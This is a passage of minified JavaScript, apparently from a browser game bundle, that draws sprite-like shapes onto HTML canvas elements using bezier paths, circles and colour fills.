                    r.bezierCurveTo(90 * e, 33 * e, 103 * e, 25 * e, 105 * e, 27 * e),
                    r.bezierCurveTo(116 * e, 31 * e, 121 * e, 45 * e, 122 * e, 50 * e),
                    r.bezierCurveTo(112 * e, 62 * e, 103 * e, 63 * e, 91 * e, 62 * e),
                    r.bezierCurveTo(89 * e, 59.5 * e, 89 * e, 59.5 * e, 87 * e, 57 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(93 * e, 81 * e),
                    r.bezierCurveTo(109 * e, 82 * e, 123 * e, 70 * e, 124 * e, 63 * e),
                    r.bezierCurveTo(124 * e, 75.5 * e, 124 * e, 75.5 * e, 124 * e, 88 * e),
                    r.bezierCurveTo(119 * e, 99 * e, 103 * e, 103 * e, 94 * e, 103 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(93 * e, 124 * e),
                    r.bezierCurveTo(108 * e, 125 * e, 122 * e, 113 * e, 124 * e, 106 * e),
                    r.bezierCurveTo(124 * e, 119 * e, 124 * e, 129 * e, 124 * e, 132 * e),
                    r.bezierCurveTo(110 * e, 147 * e, 94 * e, 148 * e, 90 * e, 147 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(90 * e, 170 * e),
                    r.bezierCurveTo(104 * e, 166 * e, 122 * e, 158 * e, 122 * e, 151 * e),
                    r.bezierCurveTo(122 * e, 162.5 * e, 122 * e, 162.5 * e, 122 * e, 174 * e),
                    r.bezierCurveTo(111 * e, 191 * e, 97 * e, 191 * e, 89 * e, 191 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(88 * e, 208 * e),
                    r.bezierCurveTo(100 * e, 209 * e, 115 * e, 205 * e, 122 * e, 193 * e),
                    r.bezierCurveTo(122 * e, 205.5 * e, 122 * e, 205.5 * e, 122 * e, 218 * e),
                    r.bezierCurveTo(115 * e, 229 * e, 103 * e, 235 * e, 90 * e, 228 * e),
                    r.bezierCurveTo(88 * e, 224 * e, 88 * e, 217 * e, 88 * e, 211 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.globalAlpha = .4,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(22 * e, 81 * e),
                    r.bezierCurveTo(32 * e, 84 * e, 41 * e, 81 * e, 45 * e, 68 * e),
                    r.bezierCurveTo(50 * e, 50 * e, 62 * e, 40 * e, 79 * e, 43 * e),
                    r.bezierCurveTo(95 * e, 45 * e, 102 * e, 58 * e, 101 * e, 81 * e),
                    r.bezierCurveTo(99.5 * e, 120.5 * e, 99.5 * e, 120.5 * e, 98 * e, 160 * e),
                    r.bezierCurveTo(96.5 * e, 191.5 * e, 96.5 * e, 191.5 * e, 95 * e, 223 * e),
                    r.bezierCurveTo(93 * e, 232 * e, 101 * e, 235 * e, 108 * e, 238 * e),
                    r.bezierCurveTo(100 * e, 240 * e, 90 * e, 233 * e, 90 * e, 224 * e),
                    r.bezierCurveTo(92 * e, 157 * e, 92 * e, 157 * e, 94 * e, 90 * e),
                    r.bezierCurveTo(94 * e, 56 * e, 89 * e, 53 * e, 77 * e, 51 * e),
                    r.bezierCurveTo(58 * e, 50 * e, 54 * e, 59 * e, 49 * e, 75 * e),
                    r.bezierCurveTo(44 * e, 91 * e, 28 * e, 90 * e, 23 * e, 81 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(82 * e, 123 * e),
                    r.bezierCurveTo(88 * e, 130 * e, 88 * e, 127 * e, 94 * e, 128 * e),
                    r.bezierCurveTo(91 * e, 136 * e, 94 * e, 137 * e, 99 * e, 142 * e),
                    r.bezierCurveTo(97 * e, 149 * e, 99 * e, 152 * e, 105 * e, 155 * e),
                    r.bezierCurveTo(107 * e, 159 * e, 113 * e, 159 * e, 120 * e, 158 * e),
                    r.bezierCurveTo(121 * e, 160 * e, 125 * e, 163 * e, 132 * e, 163 * e),
                    r.bezierCurveTo(133 * e, 166 * e, 136 * e, 169 * e, 138 * e, 170 * e),
                    r.bezierCurveTo(133 * e, 171 * e, 132 * e, 172 * e, 129 * e, 174 * e),
                    r.bezierCurveTo(122 * e, 170 * e, 120 * e, 170 * e, 116 * e, 174 * e),
                    r.bezierCurveTo(108 * e, 170.5 * e, 108 * e, 170.5 * e, 100 * e, 167 * e),
                    r.bezierCurveTo(95 * e, 172 * e, 94 * e, 179 * e, 95 * e, 184 * e),
                    r.bezierCurveTo(87 * e, 185 * e, 87 * e, 189 * e, 88 * e, 194 * e),
                    r.bezierCurveTo(82 * e, 194 * e, 81 * e, 195 * e, 79 * e, 197 * e),
                    r.bezierCurveTo(78 * e, 192 * e, 78 * e, 191 * e, 77 * e, 189 * e),
                    r.bezierCurveTo(81 * e, 185 * e, 82 * e, 183 * e, 80 * e, 176 * e),
                    r.bezierCurveTo(89 * e, 170 * e, 92 * e, 168 * e, 95 * e, 163 * e),
                    r.bezierCurveTo(91 * e, 151 * e, 88 * e, 151 * e, 82 * e, 147 * e),
                    r.bezierCurveTo(85 * e, 142 * e, 85 * e, 137 * e, 81 * e, 133 * e),
                    r.bezierCurveTo(84 * e, 127 * e, 84 * e, 125 * e, 82 * e, 124 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    ke(r, 107 * e, 152 * e, 9 * e),
                    he(r, i[6]),
                    ke(r, 105 * e, 173 * e, 9 * e),
                    he(r, i[6]),
                    ke(r, 87 * e, 161 * e, 9 * e),
                    he(r, i[6]),
                    ke(r, 106 * e, 147 * e, 4 * e),
                    he(r, i[7]),
                    ke(r, 104 * e, 167 * e, 4 * e),
                    he(r, i[7]),
                    ke(r, 86 * e, 154 * e, 4 * e),
                    he(r, i[7]),
                    n
            }
            function _t(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 350 * e,
                    n.height = 140 * e,
                    r.translate(-50 * e, -150 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(184.5 * e, 222.0625 * e),
                    r.bezierCurveTo(185.5 * e, 184.0625 * e, 302.5 * e, 171.0625 * e, 313.5 * e, 222.0625 * e),
                    r.bezierCurveTo(330.5 * e, 263.0625 * e, 181.5 * e, 274.0625 * e, 184.5 * e, 223.0625 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(131.5 * e, 241.0625 * e),
                    r.bezierCurveTo(144.5 * e, 278.0625 * e, 270.5 * e, 209.0625 * e, 228.5 * e, 174.0625 * e),
                    r.bezierCurveTo(196.5 * e, 147.0625 * e, 117.5 * e, 196.0625 * e, 131.5 * e, 240.0625 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 8 * e),
                    ke(r, 270.5 * e, 225.0625 * e, 15.811388300841896 * e),
                    he(r, i[2]),
                    ke(r, 243.5 * e, 225.0625 * e, 6.082762530298219 * e),
                    he(r, i[2]),
                    ke(r, 255.5 * e, 210.0625 * e, 10.816653826391969 * e),
                    he(r, i[2]),
                    ke(r, 167.5 * e, 215.0625 * e, 15.297058540778355 * e),
                    he(r, i[2]),
                    ke(r, 176.5 * e, 204.0625 * e, 7.280109889280518 * e),
                    he(r, i[2]),
                    ke(r, 206.5 * e, 189.0625 * e, 7.280109889280518 * e),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(151.5 * e, 212.0625 * e),
                    r.bezierCurveTo(161.5 * e, 204.0625 * e, 173.5 * e, 214.0625 * e, 158.5 * e, 221.0625 * e),
                    r.bezierCurveTo(145.5 * e, 228.0625 * e, 144.5 * e, 216.0625 * e, 151.5 * e, 212.0625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(194.5 * e, 209.0625 * e),
                    r.bezierCurveTo(205.5 * e, 202.0625 * e, 215.5 * e, 207.0625 * e, 199.5 * e, 217.0625 * e),
                    r.bezierCurveTo(187.5 * e, 224.0625 * e, 182.5 * e, 217.0625 * e, 194.5 * e, 209.0625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(188.5 * e, 183.0625 * e),
                    r.bezierCurveTo(201.5 * e, 176.0625 * e, 213.5 * e, 187.0625 * e, 193.5 * e, 193.0625 * e),
                    r.bezierCurveTo(185.5 * e, 194.0625 * e, 175.5 * e, 189.0625 * e, 188.5 * e, 183.0625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(261.5 * e, 202.0625 * e),
                    r.bezierCurveTo(274.5 * e, 201.0625 * e, 282.5 * e, 214.0625 * e, 261.5 * e, 215.0625 * e),
                    r.bezierCurveTo(246.5 * e, 214.0625 * e, 248.5 * e, 203.0625 * e, 261.5 * e, 202.0625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(240.5 * e, 231.0625 * e),
                    r.bezierCurveTo(255.5 * e, 231.0625 * e, 254.5 * e, 243.0625 * e, 240.5 * e, 242.0625 * e),
                    r.bezierCurveTo(225.5 * e, 239.0625 * e, 225.5 * e, 232.0625 * e, 240.5 * e, 231.0625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    n
            }
            function Et(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 217 * e,
                    n.height = 215 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79 * e, 113 * e),
                    r.bezierCurveTo(135 * e, 98 * e, 136 * e, 96 * e, 142 * e, 97 * e),
                    r.bezierCurveTo(167 * e, 106 * e, 167 * e, 106 * e, 171 * e, 109 * e),
                    r.bezierCurveTo(173 * e, 120 * e, 173 * e, 134 * e, 169 * e, 141 * e),
                    r.bezierCurveTo(140 * e, 149.5 * e, 140 * e, 149.5 * e, 111 * e, 158 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(154 * e, 103 * e),
                    r.bezierCurveTo(167 * e, 91 * e, 175 * e, 87 * e, 176 * e, 94 * e),
                    r.bezierCurveTo(175 * e, 102 * e, 176 * e, 102 * e, 186 * e, 103 * e),
                    r.bezierCurveTo(191 * e, 104 * e, 192 * e, 105 * e, 185 * e, 116 * e),
                    r.bezierCurveTo(183 * e, 120 * e, 191 * e, 124 * e, 189 * e, 129 * e),
                    r.bezierCurveTo(185 * e, 139 * e, 178 * e, 134 * e, 166 * e, 131 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(60 * e, 46 * e),
                    r.bezierCurveTo(60 * e, 34 * e, 60 * e, 29 * e, 56 * e, 19 * e),
                    r.bezierCurveTo(52 * e, 12 * e, 52 * e, 16 * e, 49 * e, 24 * e),
                    r.bezierCurveTo(48 * e, 27 * e, 46 * e, 28 * e, 39 * e, 27 * e),
                    r.bezierCurveTo(33 * e, 26 * e, 34 * e, 31 * e, 35 * e, 37 * e),
                    r.bezierCurveTo(36 * e, 41 * e, 27 * e, 46 * e, 29 * e, 52 * e),
                    r.bezierCurveTo(36 * e, 55 * e, 35 * e, 56 * e, 31 * e, 59 * e),
                    r.bezierCurveTo(27 * e, 65 * e, 32 * e, 64 * e, 35 * e, 62 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(46 * e, 50 * e),
                    r.bezierCurveTo(51 * e, 35 * e, 70 * e, 32 * e, 78 * e, 29 * e),
                    r.bezierCurveTo(84 * e, 27 * e, 113 * e, 36 * e, 127 * e, 41 * e),
                    r.bezierCurveTo(140 * e, 47 * e, 147 * e, 69 * e, 137 * e, 73 * e),
                    r.bezierCurveTo(124 * e, 92 * e, 117 * e, 92 * e, 109 * e, 94 * e),
                    r.bezierCurveTo(101 * e, 96 * e, 89 * e, 92 * e, 65 * e, 83 * e),
                    r.bezierCurveTo(54 * e, 80 * e, 46 * e, 58 * e, 46 * e, 51 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(51 * e, 40 * e),
                    r.bezierCurveTo(49 * e, 34 * e, 49 * e, 34 * e, 47 * e, 28 * e),
                    r.bezierCurveTo(38 * e, 28 * e, 34 * e, 27 * e, 37 * e, 37 * e),
                    r.bezierCurveTo(43 * e, 40.5 * e, 43 * e, 40.5 * e, 49 * e, 44 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(29 * e, 48 * e),
                    r.bezierCurveTo(38 * e, 49 * e, 38 * e, 49 * e, 47 * e, 50 * e),
                    r.bezierCurveTo(46.5 * e, 51.5 * e, 46.5 * e, 51.5 * e, 46 * e, 53 * e),
                    r.bezierCurveTo(40 * e, 53.5 * e, 40 * e, 53.5 * e, 34 * e, 54 * e),
                    r.bezierCurveTo(29 * e, 51 * e, 32 * e, 51.5 * e, 30 * e, 49 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(89 * e, 61 * e),
                    r.bezierCurveTo(101 * e, 70 * e, 109 * e, 90 * e, 102 * e, 90 * e),
                    r.bezierCurveTo(97 * e, 91 * e, 87 * e, 91 * e, 60 * e, 80 * e),
                    r.bezierCurveTo(48 * e, 65 * e, 46 * e, 56 * e, 48 * e, 53 * e),
                    r.bezierCurveTo(50 * e, 52 * e, 66 * e, 56 * e, 89 * e, 61 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(99 * e, 59 * e),
                    r.bezierCurveTo(115 * e, 45 * e, 125 * e, 42 * e, 129 * e, 47 * e),
                    r.bezierCurveTo(138 * e, 56 * e, 140 * e, 63 * e, 138 * e, 67 * e),
                    r.bezierCurveTo(131 * e, 80 * e, 122 * e, 87 * e, 114 * e, 90 * e),
                    r.bezierCurveTo(105 * e, 80 * e, 95 * e, 62 * e, 98 * e, 61 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(118 * e, 62 * e),
                    r.bezierCurveTo(139 * e, 45 * e, 153 * e, 40 * e, 150 * e, 48 * e),
                    r.bezierCurveTo(145 * e, 57 * e, 157 * e, 63 * e, 157 * e, 70 * e),
                    r.bezierCurveTo(157 * e, 74 * e, 142 * e, 77 * e, 142 * e, 85 * e),
                    r.bezierCurveTo(143 * e, 91 * e, 141 * e, 92 * e, 135 * e, 90 * e),
                    r.bezierCurveTo(132 * e, 90 * e, 132 * e, 96 * e, 124 * e, 99 * e),
                    r.bezierCurveTo(118 * e, 93 * e, 116 * e, 77 * e, 116 * e, 64 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(90 * e, 130 * e),
                    r.bezierCurveTo(157 * e, 115 * e, 165 * e, 111 * e, 167 * e, 115 * e),
                    r.bezierCurveTo(170 * e, 117 * e, 171 * e, 135 * e, 167 * e, 141 * e),
                    r.bezierCurveTo(135.5 * e, 149.5 * e, 135.5 * e, 149.5 * e, 104 * e, 158 * e),
                    r.closePath(),
                    he(r, i[8]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(53 * e, 119 * e),
                    r.bezierCurveTo(46 * e, 120 * e, 40 * e, 118 * e, 34 * e, 116 * e),
                    r.bezierCurveTo(28 * e, 111 * e, 41 * e, 112 * e, 39 * e, 108 * e),
                    r.bezierCurveTo(36 * e, 100 * e, 49 * e, 102 * e, 53 * e, 95 * e),
                    r.bezierCurveTo(57 * e, 84 * e, 58 * e, 85 * e, 63 * e, 93 * e),
                    r.bezierCurveTo(68 * e, 96 * e, 72 * e, 94 * e, 80 * e, 88 * e),
                    r.bezierCurveTo(80 * e, 96 * e, 78 * e, 107 * e, 66 * e, 115 * e),
                    r.closePath(),
                    he(r, i[9], i[10], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(118 * e, 64 * e),
                    r.bezierCurveTo(133.5 * e, 57 * e, 133.5 * e, 57 * e, 149 * e, 50 * e),
                    r.bezierCurveTo(145 * e, 54 * e, 154 * e, 65 * e, 157 * e, 68 * e),
                    r.bezierCurveTo(138.5 * e, 66.5 * e, 138.5 * e, 66.5 * e, 120 * e, 65 * e),
                    r.closePath(),
                    he(r, i[8]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(118 * e, 65 * e),
                    r.bezierCurveTo(129 * e, 77 * e, 129 * e, 77 * e, 140 * e, 89 * e),
                    r.bezierCurveTo(131 * e, 89 * e, 130 * e, 92 * e, 128 * e, 96 * e),
                    r.bezierCurveTo(123.5 * e, 82 * e, 123.5 * e, 82 * e, 119 * e, 68 * e),
                    r.closePath(),
                    he(r, i[8]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(51 * e, 112 * e),
                    r.bezierCurveTo(63 * e, 108 * e, 78 * e, 111 * e, 88 * e, 112 * e),
                    r.bezierCurveTo(98 * e, 122 * e, 117 * e, 136 * e, 125 * e, 157 * e),
                    r.bezierCurveTo(123 * e, 180 * e, 123 * e, 185 * e, 118 * e, 186 * e),
                    r.bezierCurveTo(101 * e, 190 * e, 89 * e, 191 * e, 79 * e, 187 * e),
                    r.bezierCurveTo(53 * e, 165 * e, 50 * e, 153 * e, 47 * e, 144 * e),
                    r.bezierCurveTo(46 * e, 128 * e, 46 * e, 124 * e, 50 * e, 112 * e),
                    r.closePath(),
                    he(r, i[9], i[10], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(50 * e, 114 * e),
                    r.bezierCurveTo(81 * e, 149 * e, 80 * e, 147 * e, 80 * e, 149 * e),
                    r.bezierCurveTo(82 * e, 155 * e, 80 * e, 182 * e, 74 * e, 182 * e),
                    r.bezierCurveTo(60 * e, 172 * e, 52 * e, 157 * e, 47 * e, 144 * e),
                    r.closePath(),
                    he(r, i[11], i[11], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(85 * e, 152 * e),
                    r.bezierCurveTo(99 * e, 150 * e, 109 * e, 152 * e, 119 * e, 156 * e),
                    r.bezierCurveTo(122 * e, 163 * e, 122 * e, 174 * e, 117 * e, 182 * e),
                    r.closePath(),
                    r.bezierCurveTo(93 * e, 188 * e, 82 * e, 187 * e, 83 * e, 179 * e),
                    he(r, i[11], i[11], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(104 * e, 166 * e),
                    r.bezierCurveTo(133 * e, 165 * e, 142 * e, 168 * e, 137 * e, 173 * e),
                    r.bezierCurveTo(127 * e, 177 * e, 137 * e, 195 * e, 126 * e, 196 * e),
                    r.bezierCurveTo(112 * e, 195 * e, 112 * e, 194 * e, 109 * e, 199 * e),
                    r.bezierCurveTo(105 * e, 205 * e, 102 * e, 195 * e, 96 * e, 197 * e),
                    r.bezierCurveTo(84 * e, 201 * e, 88 * e, 198 * e, 90 * e, 187 * e),
                    r.bezierCurveTo(96 * e, 171 * e, 97 * e, 170 * e, 103 * e, 167 * e),
                    r.closePath(),
                    he(r, i[9], i[10], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105 * e, 168 * e),
                    r.bezierCurveTo(118 * e, 172.5 * e, 118 * e, 172.5 * e, 131 * e, 177 * e),
                    r.bezierCurveTo(133 * e, 190 * e, 132 * e, 199 * e, 116 * e, 194 * e),
                    r.bezierCurveTo(110 * e, 182 * e, 110 * e, 182 * e, 104 * e, 170 * e),
                    r.closePath(),
                    he(r, i[10]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(102 * e, 169 * e),
                    r.bezierCurveTo(100.5 * e, 182 * e, 100.5 * e, 182 * e, 99 * e, 195 * e),
                    r.bezierCurveTo(93.5 * e, 196.5 * e, 93.5 * e, 196.5 * e, 88 * e, 198 * e),
                    r.bezierCurveTo(94 * e, 176 * e, 96 * e, 174 * e, 101 * e, 168 * e),
                    r.closePath(),
                    he(r, i[9], i[9], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(64 * e, 107 * e),
                    r.bezierCurveTo(64 * e, 101 * e, 64 * e, 101 * e, 64 * e, 95 * e),
                    r.bezierCurveTo(57 * e, 86 * e, 57 * e, 84 * e, 53 * e, 97 * e),
                    r.bezierCurveTo(55 * e, 103.5 * e, 55 * e, 103.5 * e, 57 * e, 110 * e),
                    r.closePath(),
                    he(r, i[11], i[11], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(40 * e, 108 * e),
                    r.bezierCurveTo(46.5 * e, 111 * e, 46.5 * e, 111 * e, 53 * e, 114 * e),
                    r.bezierCurveTo(50.5 * e, 117 * e, 50.5 * e, 117 * e, 48 * e, 120 * e),
                    r.bezierCurveTo(40.5 * e, 117.5 * e, 40.5 * e, 117.5 * e, 33 * e, 115 * e),
                    r.bezierCurveTo(36 * e, 112 * e, 36 * e, 112 * e, 39 * e, 109 * e),
                    r.closePath(),
                    he(r, i[11], i[11], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(189 * e, 106 * e),
                    r.bezierCurveTo(178.5 * e, 110.5 * e, 178.5 * e, 110.5 * e, 168 * e, 115 * e),
                    r.bezierCurveTo(168.5 * e, 119 * e, 168.5 * e, 119 * e, 169 * e, 123 * e),
                    r.bezierCurveTo(179 * e, 124.5 * e, 179 * e, 124.5 * e, 189 * e, 126 * e),
                    r.bezierCurveTo(182 * e, 118 * e, 183 * e, 115 * e, 188 * e, 106 * e),
                    r.closePath(),
                    he(r, i[8]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(69 * e, 178 * e),
                    r.bezierCurveTo(69 * e, 141 * e, 70 * e, 136 * e, 77 * e, 137 * e),
                    r.bezierCurveTo(88 * e, 133 * e, 101 * e, 134 * e, 108 * e, 137 * e),
                    he(r, void 0, i[3], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 161 * e),
                    r.bezierCurveTo(54 * e, 124 * e, 55 * e, 119 * e, 62 * e, 119 * e),
                    r.bezierCurveTo(74 * e, 117 * e, 85 * e, 117 * e, 93 * e, 119 * e),
                    he(r, void 0, i[3], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(91 * e, 29 * e),
                    r.bezierCurveTo(74 * e, 33 * e, 62 * e, 46 * e, 57 * e, 54 * e),
                    r.bezierCurveTo(57 * e, 63 * e, 68 * e, 76 * e, 77 * e, 87 * e),
                    he(r, void 0, i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(107 * e, 33 * e),
                    r.bezierCurveTo(82 * e, 51 * e, 80 * e, 52 * e, 79 * e, 59 * e),
                    r.bezierCurveTo(78 * e, 65 * e, 93 * e, 86 * e, 101 * e, 93 * e),
                    he(r, void 0, i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(130 * e, 98 * e),
                    r.bezierCurveTo(126.5 * e, 103 * e, 126.5 * e, 103 * e, 123 * e, 108 * e),
                    r.bezierCurveTo(133.5 * e, 107 * e, 133.5 * e, 107 * e, 144 * e, 106 * e),
                    r.bezierCurveTo(138.5 * e, 110 * e, 138.5 * e, 110 * e, 133 * e, 114 * e),
                    r.bezierCurveTo(142 * e, 114 * e, 142 * e, 114 * e, 151 * e, 114 * e),
                    r.bezierCurveTo(146.5 * e, 119.5 * e, 146.5 * e, 119.5 * e, 142 * e, 125 * e),
                    r.bezierCurveTo(146.5 * e, 127 * e, 146.5 * e, 127 * e, 151 * e, 129 * e),
                    r.bezierCurveTo(147.5 * e, 132 * e, 147.5 * e, 132 * e, 144 * e, 135 * e),
                    r.bezierCurveTo(148 * e, 137 * e, 148 * e, 137 * e, 152 * e, 139 * e),
                    r.bezierCurveTo(149 * e, 142.5 * e, 149 * e, 142.5 * e, 146 * e, 146 * e),
                    he(r, void 0, i[3], 4 * e),
                    n
            }
            function ut(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 118 * e,
                    n.height = 114 * e,
                    r.translate(0, 10 * e),
                    ke(r, 42 * e, 43 * e, 24.758836806279895 * e),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(65 * e, 90 * e),
                    r.bezierCurveTo(72 * e, 91 * e, 75 * e, 92 * e, 71 * e, 96 * e),
                    r.bezierCurveTo(65 * e, 98 * e, 65 * e, 94 * e, 65 * e, 91 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87 * e, 45 * e),
                    r.bezierCurveTo(108 * e, 59 * e, 100 * e, 86 * e, 85 * e, 91 * e),
                    r.bezierCurveTo(80 * e, 96 * e, 68 * e, 95 * e, 58 * e, 87 * e),
                    r.bezierCurveTo(53 * e, 80 * e, 61 * e, 64 * e, 66 * e, 58 * e),
                    r.bezierCurveTo(73 * e, 48 * e, 78 * e, 44 * e, 87 * e, 45 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(0, -10 * e),
                    ke(r, 42 * e, 43 * e, 24.758836806279895 * e),
                    he(r, i[1], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(65 * e, 90 * e),
                    r.bezierCurveTo(72 * e, 91 * e, 75 * e, 92 * e, 71 * e, 96 * e),
                    r.bezierCurveTo(65 * e, 98 * e, 65 * e, 94 * e, 65 * e, 91 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87 * e, 45 * e),
                    r.bezierCurveTo(108 * e, 59 * e, 100 * e, 86 * e, 85 * e, 91 * e),
                    r.bezierCurveTo(80 * e, 96 * e, 68 * e, 95 * e, 58 * e, 87 * e),
                    r.bezierCurveTo(53 * e, 80 * e, 61 * e, 64 * e, 66 * e, 58 * e),
                    r.bezierCurveTo(73 * e, 48 * e, 78 * e, 44 * e, 87 * e, 45 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 16 * e),
                    r.bezierCurveTo(55 * e, 19 * e, 54 * e, 20 * e, 55 * e, 22 * e),
                    r.bezierCurveTo(52 * e, 24.5 * e, 52 * e, 24.5 * e, 49 * e, 27 * e),
                    r.bezierCurveTo(45 * e, 25 * e, 45 * e, 25 * e, 41 * e, 23 * e),
                    r.bezierCurveTo(45 * e, 19 * e, 48 * e, 16 * e, 52 * e, 16 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(62 * e, 30 * e),
                    r.bezierCurveTo(66 * e, 29 * e, 64 * e, 30 * e, 66 * e, 30 * e),
                    r.bezierCurveTo(67 * e, 31 * e, 67 * e, 31 * e, 68 * e, 32 * e),
                    r.bezierCurveTo(66.5 * e, 33.5 * e, 66.5 * e, 33.5 * e, 65 * e, 35 * e),
                    r.bezierCurveTo(63.5 * e, 32.5 * e, 63.5 * e, 32.5 * e, 62 * e, 30 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(29 * e, 21 * e),
                    r.bezierCurveTo(31 * e, 22 * e, 31 * e, 26 * e, 29 * e, 29 * e),
                    r.bezierCurveTo(26 * e, 28.5 * e, 26 * e, 28.5 * e, 23 * e, 28 * e),
                    r.bezierCurveTo(23 * e, 26.5 * e, 23 * e, 26.5 * e, 23 * e, 25 * e),
                    r.bezierCurveTo(25 * e, 23 * e, 25 * e, 23 * e, 27 * e, 21 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(18 * e, 36 * e),
